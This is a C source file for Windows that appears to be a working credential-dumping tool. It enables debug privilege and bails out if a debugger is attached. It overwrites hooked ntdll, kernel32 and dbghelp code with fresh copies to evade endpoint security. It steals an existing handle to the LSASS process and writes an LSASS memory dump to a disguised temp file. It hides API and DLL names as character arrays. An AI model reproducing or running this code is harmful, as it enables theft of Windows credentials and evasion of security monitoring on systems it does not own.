#include <wchar.h>
#include <stdio.h>

#include <Windows.h>
#include <Winternl.h>
#include <DbgHelp.h>
#include <TlHelp32.h>

#pragma comment (lib, "Dbghelp")
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#ifndef NT_SUCCESS
#define NT_SUCCESS(x) ((x) >= 0)
#endif /* NT_SUCCESS() */
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

typedef HANDLE(NTAPI *_NtOpenProcess)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI *_NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI *_NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef BOOL(NTAPI *_NtQueryFullProcessImageNameW)(
	HANDLE hProcess,
	DWORD  dwFlags,
	LPWSTR lpExeName,
	PDWORD lpdwSize
	);

typedef NTSTATUS (NTAPI *_NtQueryInformationProcess) (
	HANDLE ProcessHandle, 
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef BOOL(WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI *CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI *MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI *UnmapViewOfFile_t)(LPCVOID);
VirtualProtect_t VirtualProtect_p = NULL;

static inline PVOID GetLibraryProcAddress(const char *LibraryName, const char *ProcName) {
	HMODULE hModule = GetModuleHandleA(LibraryName);
	if (NULL == hModule) {
		fprintf(stderr, "[-] GetModuleHandleA() => E%d\n", GetLastError());
		return NULL;
	}
	return GetProcAddress(hModule, ProcName);
}

void m1n1dumpIt(HANDLE hProc) {
	char *Buffer = NULL;
	char filepath[MAX_PATH] = { 0 };
	const char tmp[] = { 'T','e','m','p',0 };
	SIZE_T bufferCount = 0;
	if (EXIT_SUCCESS != _dupenv_s(&Buffer, &bufferCount, tmp)) {
		fprintf(stderr, "[-] Failed to obtain environment value => %d\n", GetLastError());
		return;
	}

	char l$$[] = { '\\','c','4','d','d','2','a','4','6','-','c','e','e','b','-','4','2','5','d','-','8','d','c','b','-','a','e','2','1','b','3','4','1','c','a','4','5','.','t','m','p',0 };
	sprintf(filepath, "%s%s", Buffer, l$$);
	free(Buffer);

	wchar_t wfilepath[MAX_PATH] = { 0 };
	mbstowcs(wfilepath, filepath, MAX_PATH);

	HANDLE hFile = CreateFile(wfilepath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile) {
		fprintf(stderr, "[-] Failed in m1n1dumpIT:CreateFile (%d)\n", GetLastError());
		return;
	} else {
		DWORD l$a$$Pid = GetProcessId(hProc);
		if (0 == l$a$$Pid) {
			fprintf(stderr, "[-] Failed to retrieve process ID => %d\n", GetLastError());
			goto _FINAL;
		}

		if (!MiniDumpWriteDump(hProc, l$a$$Pid, hFile, (MINIDUMP_TYPE) 0x00000002, NULL, NULL, NULL)) {
			fprintf(stderr, "[-] Failed in m1n1dumpIt:M1n1DumpWr1teDump (%d)\n", GetLastError());
			goto _FINAL;
		}
		
		printf("[+] 1$a$$ Dl_lmp in %s\n", filepath);

		if (!EncryptFileA(filepath)) {
			fprintf(stderr, "[-] EncryptFileA failed: %d\n", GetLastError());
		}
	}
_FINAL:
	CloseHandle(hFile);
}

int UnhookModule(const HMODULE hModule, const LPVOID pMapping) {
	/*
		UnhookDbghelp() finds .text segment of fresh loaded copy of a dll and copies over the hooked one
	*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS) ((DWORD_PTR) pMapping + pidh->e_lfanew);

	// find .text section
	for (WORD i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER) ((DWORD_PTR) IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pish->Name, ".text")) {
			// prepare hDbghelp.dll memory region for write permissions.
			VirtualProtect_p((LPVOID) ((DWORD_PTR) hModule + (DWORD_PTR) pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
			if (!oldprotect) {
				// RWX failed!
				fprintf(stderr, "[-] Unable to RWX => %d\n", GetLastError());
				return EXIT_FAILURE;
			}

			memcpy((LPVOID) ((DWORD_PTR) hModule + (DWORD_PTR) pish->VirtualAddress), (LPVOID) ((DWORD_PTR) pMapping + (DWORD_PTR) pish->VirtualAddress), pish->Misc.VirtualSize);
			
			// restore original protection settings of hDbghelp
			VirtualProtect_p((LPVOID) ((DWORD_PTR) hModule + (DWORD_PTR) pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
			if (!oldprotect) {
				// it failed
				fprintf(stderr, "[-] Unable to restore prot => %d\n", GetLastError());
				return EXIT_FAILURE;
			}
			// all is good, time to go home
			return EXIT_SUCCESS;
		}
	}
	// .text section not found?
	return EXIT_FAILURE;
}

BOOL IsElevated(HANDLE curProcHandle, HANDLE hToken) {
	TOKEN_ELEVATION tokElevation = { 0 };
	DWORD cbSize = 0;
	if (!GetTokenInformation(hToken, TokenElevation, &tokElevation, sizeof(tokElevation), &cbSize)) {
		fprintf(stderr, "[-] GetTokenInformation() => %d\n", GetLastError());
		return FALSE;
	}

	return tokElevation.TokenIsElevated;
}

BOOL SetDebugPrivilege(HANDLE curProcHandle, HANDLE hToken) {
	BOOL ret = TRUE;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	const wchar_t lpwPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR) lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		fprintf(stderr, "I dont have SeDebugPirvs\n");
		ret = FALSE;
	} else {
		if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
			fprintf(stderr, "[-] Could not elevate token privileges to SeDebugPrivs => %d\n", GetLastError());
			ret = FALSE;
		}
	}

	return ret;
}

void FreshCopy(const unsigned char *modulePath, const unsigned char *moduleName) {
	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

	const unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
	const unsigned char sDbghelp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0x0 };
	const unsigned char sDbghelpPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0 };

	unsigned int sDbghelpPath_len = sizeof(sDbghelpPath);
	unsigned int sDbghelp_len = sizeof(sDbghelp);
	
	HANDLE moduleHandle = GetModuleHandleA(moduleName);
	if (NULL == moduleHandle) {
		fprintf(stderr, "[-] Unable to get module handle => %d\n", GetLastError());
		return;
	}

	HANDLE hFile = NULL, hFileMapping = NULL;
	LPVOID pMapping;


	HANDLE k32Handle = GetModuleHandleA((LPCSTR) sKernel32);
	if (NULL == k32Handle) {
		fprintf(stderr, "[-] Unable to obtain k32.d11 handle => %d\n", GetLastError());
		return;
	}
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(k32Handle, (LPCSTR) sCreateFileMappingA);;
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(k32Handle, (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(k32Handle, (LPCSTR) sUnmapViewOfFile);
	VirtualProtect_p = (VirtualProtect_t) GetProcAddress(k32Handle, (LPCSTR) sVirtualProtect);

	if (NULL == CreateFileMappingA_p || NULL == MapViewOfFile_p || NULL == UnmapViewOfFile_p || NULL == VirtualProtect_p) {
		fprintf(stderr, "[-] Unable to get exports\n");
		return;
	}

	// open the DLL
	hFile = CreateFileA((LPCSTR) modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		// failed to open the DLL
		fprintf(stderr, "[-] Failed to open N7D11.D11 => E%d\n", GetLastError());
		return;
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (NULL == hFileMapping) {
		// file mapping failed
		fprintf(stderr, "[-] File mapping failed %d\n", GetLastError());
		goto _FINAL;
	}

	// map the bastard
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (NULL == pMapping) {
		fprintf(stderr, "[-] Mapping failed %d\n", GetLastError());
		goto _FINAL;
	}
	// remove hooks
	UnhookModule(GetModuleHandleA((LPCSTR) moduleName), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
_FINAL:
	if (NULL != hFileMapping) {
		CloseHandle(hFileMapping);
	}
	if (NULL != hFile) {
		CloseHandle(hFile);
	}
}


// https://github.com/kartikdurg/Enum-LSASS/blob/main/Example/enum_lsass_handles.c
HANDLE enum_lsass_handles(HANDLE curProcHandle) {
	const unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
	const unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };

	const char qsysinfo[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
	const char dupo[] = { 'N','t','D','u','p','l','i','c','a','t','e','O','b','j','e','c','t',0 };
	const char qo[] = { 'N','t','Q','u','e','r','y','O','b','j','e','c','t',0 };
	const char qfpi[] = { 'Q','u','e','r','y','F','u','l','l','P','r','o','c','e','s','s','I','m','a','g','e','N','a','m','e','W',0 };
	const char op[] = { 'O','p','e','n','P','r','o','c','e','s','s',0 };

	const wchar_t l$a$$str[] = {'l', 's', 'a', 's', 's', 0 };

	_NtQuerySystemInformation ffNtQuery_SystemInformation = (_NtQuerySystemInformation) GetLibraryProcAddress((PSTR) sNtdll, qsysinfo);
	_NtDuplicateObject ffNtDuplicate_Object = (_NtDuplicateObject) GetLibraryProcAddress((PSTR) sNtdll, dupo);
	_NtQueryObject ffNtQuery_Object = (_NtQueryObject) GetLibraryProcAddress((PSTR) sNtdll, qo);
	_NtQueryFullProcessImageNameW ffNtQuery_FullProcessImageNameW = (_NtQueryFullProcessImageNameW) GetLibraryProcAddress((PSTR) sKernel32, qfpi);
	_NtOpenProcess ffNtOpen_Process = (_NtOpenProcess) GetLibraryProcAddress((PSTR) sKernel32, op);

	if (
		NULL == ffNtQuery_SystemInformation ||
		NULL == ffNtDuplicate_Object ||
		NULL == ffNtQuery_Object||
		NULL == ffNtQuery_FullProcessImageNameW ||
		NULL == ffNtOpen_Process
		) {
		return NULL;
	}

	NTSTATUS status = EXIT_SUCCESS;
	PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
	HANDLE processHandle = NULL, lsass_handles = NULL;
	
	ULONG handleInfoSize = 0x10000;

	handleInfo = (PSYSTEM_HANDLE_INFORMATION) malloc(handleInfoSize);

	if (NULL == handleInfo) {
		fprintf(stderr, "[-] Unable to allocate memory => %d\n", errno);
		return NULL;
	}

	// NtQuerySystemInformation won't give us the correct buffer size,
	//  so we guess by doubling the buffer size.
	while (STATUS_INFO_LENGTH_MISMATCH == (status = ffNtQuery_SystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	))) {
		void *ptr = realloc(handleInfo, handleInfoSize *= 2);
		if (NULL == ptr) {
			fprintf(stderr, "[-] realloc() failed => %d\n", errno);
			free(handleInfo);
			return NULL;
		}
		handleInfo = ptr;
	}

	// NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
	if (!NT_SUCCESS(status)) {
		fprintf(stderr, "NtQSysInformation failed => E%ld\n", status);
		return NULL;
	}

	for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
		SYSTEM_HANDLE handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;

		// Check if PID belongs to System
		if (4 == handle.ProcessId)
			continue;

		processHandle = ffNtOpen_Process(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId);

		if (NULL == processHandle) {
			continue;
		}

		status = ffNtDuplicate_Object(
			processHandle,
			(void *) handle.Handle,
			curProcHandle,
			&dupHandle,
			PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
			0,
			0
		);

		// Duplicate the handle so we can query it.
		if (!NT_SUCCESS(status)) {
			continue;
		}

		// Query the object type.
		objectTypeInfo = (POBJECT_TYPE_INFORMATION) malloc(0x1000);
		if (NULL == objectTypeInfo) {
			fprintf(stderr, "[-] Unable to allocate memory => %d\n", GetLastError());
			continue; // ? or exit()?
		}
		memset(objectTypeInfo, 0, 0x1000);

		status = ffNtQuery_Object(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		);

		if (!NT_SUCCESS(status)) {
			fprintf(stderr, "[-] NtQueryObject failure => %ld\n", status);
			continue;
		}

		UNICODE_STRING objectType = *(PUNICODE_STRING) objectTypeInfo;

		wchar_t path[MAX_PATH] = { 0 };
		DWORD maxPath = MAX_PATH;

		if (wcsstr(objectType.Buffer, L"Process") != NULL) {
			// Print handle, type and its PID
			ffNtQuery_FullProcessImageNameW(dupHandle, 0, path, &maxPath);
			if (wcsstr(path, l$a$$str) != NULL) {
				printf("[%#x] %S: %d %ws\n", handle.Handle, objectType.Buffer, handle.ProcessId, path);
				lsass_handles = dupHandle;
			}
		}
		free(objectTypeInfo);
	}
	free(handleInfo);

	return lsass_handles;
}

int main(int argc, char **argv) {
	const unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
	const unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
	const unsigned char sDbghelp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0x0 };
	const unsigned char sAdvapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };

	const unsigned char sDbghelpPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0 };
	const unsigned char sNtdllPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
	const unsigned char sKernel32Path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l',0 };


	ULONG length = 0;
	HANDLE hToken = NULL;
	HANDLE l$Handle = NULL;
	NTSTATUS status = EXIT_SUCCESS;
	_NtQueryInformationProcess NtQueryInformationProcess = NULL;
	PROCESS_BASIC_INFORMATION ProcessInformation = { 0 };
	HINSTANCE hNtDll = LoadLibraryA(sNtdll);
	if (NULL == hNtDll) {
		fprintf(stderr, "[-] LoadLibraryA() => %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	HANDLE curProcHandle = GetCurrentProcess();
	if (NULL == curProcHandle) {
		fprintf(stderr, "[-] Unable to obtain handle to current process (lmao wat) => %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	if (!OpenProcessToken(curProcHandle, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		fprintf(stderr, "[-] Unable to open current process 70K3N => %d\n", GetLastError());
		return EXIT_FAILURE;
	}
	
	NtQueryInformationProcess = (_NtQueryInformationProcess) GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (NULL == NtQueryInformationProcess) {
		fprintf(stderr, "[-] Unable to get export for NtQueryInformationProcess => %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	status = NtQueryInformationProcess(curProcHandle, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &length);

	//get _PEB object
	if (!NT_SUCCESS(status) || NULL == ProcessInformation.PebBaseAddress) {
		fprintf(stderr, "[-] NtQueryInformationProcess() => %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	if (ProcessInformation.PebBaseAddress->BeingDebugged) {
		return EXIT_FAILURE;
	}

	if (!IsElevated(curProcHandle, hToken)) {
		fprintf(stderr, "[-] Not running with admin rights\n");
		return EXIT_FAILURE;;
	}
	if (!SetDebugPrivilege(curProcHandle, hToken)) {
		return EXIT_FAILURE;
	}

	CloseHandle(hToken);

	FreshCopy(sNtdllPath, sNtdll);
	FreshCopy(sKernel32Path, sKernel32);
	FreshCopy(sDbghelpPath, sDbghelp);

	l$Handle = enum_lsass_handles(curProcHandle);

	if (NULL == l$Handle) {
		return EXIT_FAILURE;
	}

	m1n1dumpIt(l$Handle);
	CloseHandle(l$Handle);
	return EXIT_SUCCESS;
}

